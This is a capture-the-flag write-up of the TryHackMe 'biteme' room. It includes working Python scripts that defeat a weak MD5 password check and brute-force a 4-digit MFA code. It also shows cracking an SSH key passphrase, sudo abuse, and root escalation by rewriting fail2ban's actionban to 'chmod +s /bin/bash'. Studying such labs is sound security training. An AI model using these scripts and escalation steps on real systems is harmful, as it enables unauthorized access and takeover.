# biteme

## Introduction:

Welcome to my another writeup! In this TryHackMe [biteme](https://tryhackme.com/room/biteme) room, you'll learn: PHP file syntax highlighting, reviewing PHP source code to find logical vulnerability, writing custom python script to bruteforce MFA (Multi-Factor Authentication), Fail2Ban and more! Without further ado, let's dive in.

## Background

> Stay out of my server!

> Difficulty: Medium

```
Start the machine and get the flags...
```

- Overall difficulty for me: Medium
    - Initial foothold: Medium
    - Privilege escalation: Easy

# Service Enumeration

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/biteme]
└─# export RHOSTS=10.10.208.0 
                                                                                                                         
┌──(root🌸siunam)-[~/ctf/thm/ctf/biteme]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 89:ec:67:1a:85:87:c6:f6:64:ad:a7:d1:9e:3a:11:94 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOkcBZItsAyhmjKqiIiedZbAsFGm/mkiNHjvggYp3zna1Skix9xMhpVbSlVCS7m/AJdWkjKFqK53OfyP6eMEMI4EaJgAT+G0HSsxqH+NlnuAm4dcXsprxT1UluIeZhZ2zG2k9H6Qkz81TgZOuU3+cZ/DDizIgDrWGii1gl7dmKFeuz/KeRXkpiPFuvXj2rlFOCpGDY7TXMt/HpVoh+sPmRTq/lm7roL4468xeVN756TDNhNa9HLzLY7voOKhw0rlZyccx0hGHKNplx4RsvdkeqmoGnRHtaCS7qdeoTRuzRIedgBNpV00dB/4G+6lylt0LDbNzcxB7cvwmqEb2ZYGzn
|   256 7f:6b:3c:f8:21:50:d9:8b:52:04:34:a5:4d:03:3a:26 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOZGQ8PK6Ag3kAOQljaZdiZTitqMfwmwu6V5pq1KlrQRl4funq9C45sVL+bQ9bOPd8f9acMNp6lqOsu+jJgiec4=
|   256 c4:5b:e5:26:94:06:ee:76:21:75:27:bc:cd:ba:af:cc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMpXlaxVKC/3LXrhUOMsOPBzptNVa1u/dfUFCM3ZJMIA
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 2 ports are opened:

Ports Open        | Service
------------------|------------------------
22                | OpenSSH 7.6p1 Ubuntu
80                | Apache 2.4.29 (Ubuntu)

## HTTP on Port 80

Let's enumerate hidden directory via `gobuster` first!

**Gobuster:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/biteme]
└─# gobuster dir -u http://$RHOSTS/ -w /usr/share/wordlists/dirb/common.txt -t 100
[...]
/console              (Status: 301) [Size: 312] [--> http://10.10.208.0/console/]
```

In the above `gobuster` output, we can see that there is a `/console/` directory:

**`/console/`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/biteme/images/a1.png)

It's a login page.

Let's try SQL injection to bypass authentication:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/biteme/images/a2.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/biteme/images/a3.png)

Nope. It might not vulnerable to SQL injection.

**I also see that the login page is using `securimage` for captcha.**
```html
<img style="float: left; padding-right: 5px" id="captcha_image" src="/console/securimage/securimage_show.php?e4f478dc25617c492b0c8e4713b29ff7" alt="CAPTCHA Image" /><div id="captcha_image_audio_div">
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/biteme/images/a4.png)

**`/console/securimage/README.txt`:**
```
NAME:

    Securimage - A PHP class for creating captcha images and audio with many options.

VERSION:

    3.6.8
[...]
```

**We can try to searching public exploits for this `securimage` version.**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/biteme]
└─# searchsploit securimage
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
PHP Captcha / Securimage 2.0.2 - Authentication Bypass                            | php/webapps/17309.txt
Securimage - 'example_form.php' Cross-Site Scripting                              | php/webapps/38509.txt
WordPress Plugin Securimage-WP - 'siwp_test.php' Cross-Site Scripting             | php/webapps/38510.txt
---------------------------------------------------------------------------------- ---------------------------------
```

But no dice...

**However, in the View-Source of the `/console/index.php`, I saw an interesting javascript function:**
```html
    <script>
      function handleSubmit() {
        eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.1(\'2\').3=\'4\';5.6(\'@7 8 9 a b c d e f g h i... j\');',20,20,'document|getElementById|clicked|value|yes|console|log|fred|I|turned|on|php|file|syntax|highlighting|for|you|to|review|jason'.split('|'),0,{}))
        return true;
      }
    </script>
```

You can see it's being "obfuscated" by `packer`. (As you can tell it's `packer` in the function's argument: `function(p,a,c,k,e,r)`)

**[JavaScript Deobfuscator and Unpacker](https://lelinhtinh.github.io/de4js/):**
```js
function handleSubmit() {
    document.getElementById('clicked').value = 'yes';
    console.log('@fred I turned on php file syntax highlighting for you to review... jason');
    return true;
}
```

It has a weird string in `console.log()`.

`@fred I turned on php file syntax highlighting for you to review... jason`

**Since I know nothing about `php file syntax highlighting`, so I googled for it.**

According to [PHP document](https://www.php.net/manual/en/function.highlight-file.php), it said:

> Many servers are configured to automatically highlight files with a `phps` extension. For example, `example.phps` when viewed will show the syntax highlighted source of the file. To enable this, add this line to the `httpd.conf`:

```
AddType application/x-httpd-php-source .phps
```

Hmm... Maybe the `/console/index.php` has another file called: `/console/index.phps`? Let's try that:

**`/console/index.phps`:**
```php
<?php
session_start();

include('functions.php');
include('securimage/securimage.php');

$showError = false;
$showCaptchaError = false;

if (isset($_POST['user']) && isset($_POST['pwd']) && isset($_POST['captcha_code']) && isset($_POST['clicked']) && $_POST['clicked'] === 'yes') {
    $image = new Securimage();

    if (!$image->check($_POST['captcha_code'])) {
        $showCaptchaError = true;
    } else {
        if (is_valid_user($_POST['user']) && is_valid_pwd($_POST['pwd'])) {
            setcookie('user', $_POST['user'], 0, '/');
            setcookie('pwd', $_POST['pwd'], 0, '/');
            header('Location: mfa.php');
            exit();
        } else {
            $showError = true;
        }
    }
}
```

Ohh!! We found the source code of the `/console/index.php`!

By looking through the source code, we see that:

- It includes `functions.php`.
- If the username and password are valid, then redirect to `mfa.php`.

The `functions.php` and `mfa.php` looks promising.

Let's check `functions.php` first.

**If php file syntax highlighting is on in `/console/index.php`, we can also assume that the `/console/functions.php` has `phps` file!**

**`/console/functions.phps`:**
```php
 <?php
include('config.php');

function is_valid_user($user) {
    $user = bin2hex($user);

    return $user === LOGIN_USER;
}

// @fred let's talk about ways to make this more secure but still flexible
function is_valid_pwd($pwd) {
    $hash = md5($pwd);

    return substr($hash, -3) === '001';
} 
```

Again, check the `config.php`.

**`/console/config.php`:**
```php
 <?php

define('LOGIN_USER', '6a61736f6e5f746573745f6163636f756e74'); 
```

**Before we move on, let's take a look at the PHP code in `function.php`:**
```php
function is_valid_user($user) {
    $user = bin2hex($user);

    return $user === LOGIN_USER;
}
```

**The `LOGIN_USER` is being converted into hexadecimal. Let's decode that via `xxd`!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/biteme]
└─# echo "6a61736f6e5f746573745f6163636f756e74" | xxd -r -p            
jason_test_account
```

- Found username: `jason_test_account`

**Also, the function `is_valid_pwd()` looks weird in `return`:**
```php
// @fred let's talk about ways to make this more secure but still flexible
function is_valid_pwd($pwd) {
    $hash = md5($pwd);

    return substr($hash, -3) === '001';
} 
```

It takes the MD5 hashed password, and **check the last 3 characters are equal to `001` or not. If it's equal to `001`, then return `True`.**

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/biteme]
└─# php -a       
Interactive shell

php > $variable = "hello world";
php > echo substr($variable, -3);
rld
```

**Hmm... What if we generate a MD5 hash that the last 3 characters are `001`?**

***I'll write a simple python script to do that:***

**gen_md5hash.py:**
```py
#!/usr/bin/env python3

from hashlib import md5
import random
from string import ascii_lowercase

while True:
	# Randomly select 6 lowercase characters as the password.
	random_password = ''.join([random.choice(ascii_lowercase)for char in range(1, 6)])
	md5hash = md5(random_password.encode())
	hashed = md5hash.hexdigest()

	# If the hash's last 3 characters equals to '001', then do:
	if hashed[-3:] == '001':
		print('[+] Found the last 3 MD5 characters are equals to 001!')
		print(f'[+] Before MD5 hash: {random_password}')
		print(f'[+] After MD5 hash: {hashed}')
		exit()
```

**Output:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/biteme]
└─# python3 gen_md5hash.py
[+] Found the last 3 MD5 characters are equals to 001!
[+] Before MD5 hash: muhuo
[+] After MD5 hash: 01402432df5dac990ba03e0d00382001
```

**Since we found a username, let's use the above password to login to `/console/index.php`!**

- Username: jason_test_account
- Password: muhuo

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/biteme/images/a5.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/biteme/images/a6.png)

Yes!! We sort of logged in. As what we just found in `/console/index.phps`, after sending a POST request in `/console/index.php`, we'll be redirected to `/console/mfa.php`.

```
A 4 digit code has been sent to your device
```

4 digit? Maybe we can bruteforce it??

**Anyways, let's look at the View-Source page:**
```html
    <script>
      function handleSubmit() {
        eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.1(\'@2 3 4 5 6 7 8 9 a b c, d e f g h... i\');',19,19,'console|log|fred|we|need|to|put|some|brute|force|protection|on|here|remind|me|in|the|morning|jason'.split('|'),0,{}));
        return true;
      }
    </script>
```

```
fred we need to put some brute force protection on here remind me in the morning jason
```

***Again, I'll write a simple python script to bruteforce it:***

**mfa_brute.py:**
```py
#!/usr/bin/env python3

import requests

url = 'http://10.10.136.9/console/mfa.php'
cookies = {'pwd': 'muhuo', 'user': 'jason_test_account'}
code = ["%04d" % num for num in range(10000)] # A list that stores 0000 to 9999

for number in code:
	payload = {'code': number}
	r = requests.post(url, cookies=cookies, data=payload)

	incorrect_msg = str(r.headers['Content-length'])
	print('\r', end='') # Clear previous line.
	print(f'[+] Bruteforcing code: {number}\n', end='')

	if incorrect_msg != "919": # Incorrect code content length is 919.
		print(f'[+] Found MFA code: {number}')
		exit()
```

**Output:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/biteme]
└─# python3 mfa_brute.py
[+] Bruteforcing code: 2416
[+] Found MFA code: 2416
```

Found it!

> Note1: Each time the machine started, the code will be regenerated.

> Note2: Since I'm still learning python, I'm not good at building a multithreading script, so the bruteforce script is kinda slow.

**Armed with this information, we now finally can login into the login page!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/biteme/images/a7.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/biteme/images/a8.png)

# Initial Foothold

**In the `dashboard`, we can see 2 things: `File browser` and `File viewer`.**

**File viewer:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/biteme/images/a9.png)

I can read everything in the system.

**File browser:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/biteme/images/a10.png)

I can list everything in the system.

**We can also see that there are 2 users in the system: `jason`, `fred`.**

Hmm... **What if their home directory has private SSH key??**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/biteme/images/a11.png)

Nothing in `fred`. How about `jason`?

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/biteme/images/a12.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/biteme/images/a13.png)

It has a `.ssh` directory and **found a private SSH key**!

**Let's read that private key via `File viewer`!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/biteme/images/a14.png)

**Copy and paste it to your attacker machine, and mark it as read/write by root (or your current user):**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/biteme]
└─# nano jason_id_rsa              
                                                                                                                         
┌──(root🌸siunam)-[~/ctf/thm/ctf/biteme]
└─# chmod 600 jason_id_rsa
```

**We can now SSH into jason!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/biteme]
└─# ssh -i jason_id_rsa jason@$RHOSTS
[...]
Enter passphrase for key 'jason_id_rsa': 
jason@10.10.136.9's password:
```

Ahh... It needs a passphrase.

**We can crack it via `ssh2john` and `john`!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/biteme]
└─# ssh2john jason_id_rsa > jason_id_rsa.hash

┌──(root🌸siunam)-[~/ctf/thm/ctf/biteme]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt jason_id_rsa.hash
[...]
{Redacted}         (jason_id_rsa)
```

**Found it! Now let's `ssh` into jason with the private key!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/biteme]
└─# ssh -i jason_id_rsa jason@$RHOSTS        
Enter passphrase for key 'jason_id_rsa': 
Last login: Fri Mar  4 18:22:12 2022 from 10.0.2.2
jason@biteme:~$ whoami;hostname;id;ip a
jason
biteme
uid=1000(jason) gid=1000(jason) groups=1000(jason),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:62:cd:c5:ec:75 brd ff:ff:ff:ff:ff:ff
    inet 10.10.136.9/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2709sec preferred_lft 2709sec
    inet6 fe80::62:cdff:fec5:ec75/64 scope link 
       valid_lft forever preferred_lft forever
```

We're `jason`!

**user.txt:**
```
jason@biteme:~$ cat /home/jason/user.txt 
THM{Redacted}
```

# Privilege Escalation

## jason to fred

**Sudo permission:**
```
jason@biteme:~$ sudo -l
Matching Defaults entries for jason on biteme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jason may run the following commands on biteme:
    (ALL : ALL) ALL
    (fred) NOPASSWD: ALL
```

In the sudo permission, **we can execute any command as root, but it requires password.**

**However, we can execute any command as user `fred` without password!** (`NOPASSWD`)

**To do so, I'll:**

- Spawn a bash shell as user `fred`:

```
jason@biteme:~$ sudo -u fred /bin/bash
fred@biteme:~$ whoami;id
fred
uid=1001(fred) gid=1001(fred) groups=1001(fred)
```

I'm `fred`!

## fred to root

**Sudo permission:**
```
fred@biteme:~$ sudo -l
Matching Defaults entries for fred on biteme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on biteme:
    (root) NOPASSWD: /bin/systemctl restart fail2ban
```

**User `fred` is able to run `/bin/systemctl restart fail2ban` as root without password, and we can gain root privilege from it**

> Fail2ban is an intrusion prevention software framework. Written in the Python programming language, it is designed to prevent against brute-force attacks. It is able to run on POSIX systems that have an interface to a packet-control system or firewall installed locally, such as iptables or TCP Wrapper. (Source: [Wikipedia](https://en.wikipedia.org/wiki/Fail2ban))

**To do so, I'll:**

- `Find` writable config files:

```
fred@biteme:~$ find /etc -writable -ls 2>/dev/null
   156253      4 drwxrwxrwx   2 root     root         4096 Nov 13  2021 /etc/fail2ban/action.d
   142010      4 -rw-r--r--   1 fred     root         1420 Nov 13  2021 /etc/fail2ban/action.d/iptables-multiport.conf
```

As we can see, **the `/etc/fail2ban/action.d/iptables-multiport.conf` is writable for us.**

**iptables-multiport.conf:**
```
fred@biteme:/etc/fail2ban/action.d$ cat iptables-multiport.conf
[...]
# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
[...]
```

Hmm... Since we have access to write stuff into it, **what if it adds SUID sticky bit into `/bin/bash`, instead of executing the `iptables` command when we trigged the `actionban`??**

- Modify the `iptables-multiport.conf`'s `actionban`:

```
actionban = chmod +s /bin/bash
```

- Restart the `fail2ban` service to apply changes:

```
fred@biteme:/etc/fail2ban/action.d$ sudo /bin/systemctl restart fail2ban
```

- Trigger the `actionban` by bruteforcing SSH:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/biteme]
└─# hydra -l anyuser -P /usr/share/wordlists/rockyou.txt ssh://$RHOSTS
[...]
```

- Verify the exploit works:

```
fred@biteme:/etc/fail2ban/action.d$ ls -lah /bin/bash
-rwsr-sr-x 1 root root 1.1M Jun  6  2019 /bin/bash
```

It works!! **Let's spawn a bash shell with SUID privilege!**

```
fred@biteme:/etc/fail2ban/action.d$ /bin/bash -p
bash-4.4# whoami;hostname;id;ip a
root
biteme
uid=1001(fred) gid=1001(fred) euid=0(root) egid=0(root) groups=0(root),1001(fred)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:62:cd:c5:ec:75 brd ff:ff:ff:ff:ff:ff
    inet 10.10.136.9/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3001sec preferred_lft 3001sec
    inet6 fe80::62:cdff:fec5:ec75/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

# Rooted

**root.txt:**
```
bash-4.4# cat /root/root.txt
THM{Redacted}
```

# Conclusion

What we've learned:

1. Directory Enumeration
2. PHP File Syntax Highlighting
3. Reviewing PHP Source Code
4. Writing Custom Python Script to Generate MD5 Hashes
5. Bypassing Login Page Authentication via Logical Vulnerability
6. Writing Custom Python Script to Bruteforce MFA (Multi-Factor Authentication)
7. Cracking Private SSH Key's Passphrase
8. Privilege Escalation via Misconfigured Sudo Permission
9. Privilege Escalation via Misconfigured Fail2Ban Configuration File Permission